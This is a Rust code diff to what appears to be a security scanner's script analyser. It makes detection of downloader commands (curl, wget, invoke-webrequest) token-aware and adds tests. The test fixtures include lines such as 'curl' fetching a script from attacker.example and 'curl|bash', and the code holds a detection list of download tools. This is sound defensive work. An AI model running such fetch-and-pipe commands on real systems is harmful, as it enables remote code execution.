@@ -25,6 +25,7 @@ use std::path::Path;
 const HASH_COMMENT_LANGUAGES: &[&str] = &[
     "sh", "bash", "zsh", "ksh", "fish", "py", "rb", "pl", "yaml", "yml", "ps1", "psm1", "psd1",
 ];
+const SCRIPT_DOWNLOAD_COMMAND_TOKENS: &[&str] = &["curl", "wget", "invoke-webrequest"];
 
 /// Strip inline `#` comments from `content` for the languages in
 /// [`HASH_COMMENT_LANGUAGES`], preserving line structure (line count
@@ -152,9 +153,7 @@ pub(crate) fn script_capabilities(content: &str) -> Vec<ArtifactCapabilityFact> 
     let lower = content.to_ascii_lowercase();
     let mut capabilities = Vec::new();
 
-    if lower.contains("curl ")
-        || lower.contains("wget ")
-        || lower.contains("invoke-webrequest")
+    if lower.lines().any(line_contains_download_command)
         || lower.contains("http://")
         || lower.contains("https://")
     {
@@ -300,7 +299,7 @@ fn contains_shell_append_redirect(lower: &str) -> bool {
 pub(crate) fn script_relations(content: &str) -> Vec<ArtifactLink> {
     let lower = content.to_ascii_lowercase();
     let mut links = Vec::new();
-    if lower.contains("curl ") || lower.contains("wget ") || lower.contains("invoke-webrequest") {
+    if lower.lines().any(line_contains_download_command) {
         links.push(ArtifactLink {
             target: "remote-resource".to_string(),
             relation: ArtifactRelation::Downloads,
@@ -394,6 +393,44 @@ pub(crate) fn script_relations(content: &str) -> Vec<ArtifactLink> {
         });
     }
     links
+}
+
+fn line_contains_download_command(line: &str) -> bool {
+    SCRIPT_DOWNLOAD_COMMAND_TOKENS
+        .iter()
+        .any(|token| line_contains_command_token(line, token))
+}
+
+fn line_contains_command_token(line: &str, token: &str) -> bool {
+    let mut start = 0;
+    while let Some(pos) = line[start..].find(token) {
+        let abs_pos = start + pos;
+        let token_end = abs_pos + token.len();
+        let before = if abs_pos > 0 {
+            line.as_bytes().get(abs_pos - 1)
+        } else {
+            None
+        };
+        let left_ok = before.is_none()
+            || matches!(
+                before,
+                Some(b' ') | Some(b'\t') | Some(b'|') | Some(b';') | Some(b'&') | Some(b'/')
+            );
+        let after = line.get(token_end..).unwrap_or("");
+        let right_ok = after.is_empty()
+            || after.starts_with(' ')
+            || after.starts_with('\t')
+            || after.starts_with('|')
+            || after.starts_with(';')
+            || after.starts_with('&')
+            || after.starts_with('>')
+            || after.starts_with('<');
+        if left_ok && right_ok {
+            return true;
+        }
+        start = token_end;
+    }
+    false
 }
 
 #[cfg(test)]
@@ -513,6 +550,49 @@ mod tests {
             .iter()
             .any(|c| c.capability == ArtifactCapability::ProcessExecution));
         assert!(relation_target_present(&links, "process"));
+    }
+
+    /// # Contract
+    ///
+    /// Tabs and shell operators are valid command separators. Downloader
+    /// commands using them still produce NetworkAccess and Downloads
+    /// graph evidence.
+    #[test]
+    fn script_download_command_matching_accepts_tabs_and_pipe_boundaries() {
+        for content in [
+            "curl\thttps://attacker.example/tool.sh\n",
+            "wget\thttps://attacker.example/tool.sh\n",
+            "curl|bash\n",
+        ] {
+            let caps = script_capabilities(content);
+            assert!(
+                capability_present(&caps, ArtifactCapability::NetworkAccess),
+                "download command must raise NetworkAccess for {content:?}; got {caps:?}",
+            );
+            let links = script_relations(content);
+            assert!(
+                relation_target_present(&links, "remote-resource"),
+                "download command must raise Downloads edge for {content:?}; got {links:?}",
+            );
+        }
+    }
+
+    /// # Contract (negative)
+    ///
+    /// Downloader matching is command-token aware. Lookalike command names
+    /// must not create Downloads edges.
+    #[test]
+    fn script_download_command_matching_rejects_substrings() {
+        for content in [
+            "mycurl\thttps://attacker.example/tool.sh\n",
+            "awget\thttps://attacker.example/tool.sh\n",
+        ] {
+            let links = script_relations(content);
+            assert!(
+                !relation_target_present(&links, "remote-resource"),
+                "lookalike command must not raise Downloads edge for {content:?}; got {links:?}",
+            );
+        }
     }
 
     /// Contract: an inline `#` comment in a shell script MUST be
